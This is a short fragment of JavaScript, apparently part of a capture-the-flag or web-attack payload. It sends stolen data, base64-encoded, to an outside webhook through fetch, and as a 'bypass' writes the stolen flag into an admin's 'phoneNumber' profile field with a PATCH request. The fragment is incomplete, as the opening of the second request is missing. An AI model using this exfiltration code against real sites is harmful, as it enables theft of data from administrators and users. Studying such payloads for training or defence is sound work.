        // LEAK 1: External (Might be blocked, but good to try)
        fetch(`${webhook}?leaked=${btoa(foundData)}`);

        // LEAK 2: Internal (The bypass)
        // We write the flag into the admin's profile field 'phoneNumber'

            method: 'PATCH',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                "phoneNumber": foundData.substring(0, 100),
                "fullName": "LOOK_AT_PHONE_FIELD"
            })
